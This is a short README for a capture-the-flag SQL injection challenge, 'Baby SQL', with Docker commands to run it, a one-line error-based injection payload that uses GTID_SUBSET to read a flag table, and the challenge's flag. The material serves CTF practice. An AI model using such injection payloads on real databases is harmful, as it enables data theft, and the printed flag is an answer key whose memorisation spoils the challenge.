# Baby SQL

## RUN
```bash
docker build -t babysql2 .
docker tag babysql2 ccr.ccs.tencentyun.com/360ctf/babysql2
docker run -it --rm -p 5000:5000 --name babysql2 babysql2
```


## PoC

```http
rand='-GTID_SUBSET(TRIM((select flag from flag)),1)-'
```

flag{281c824468eb40e6cbae1000d6b5f1e3}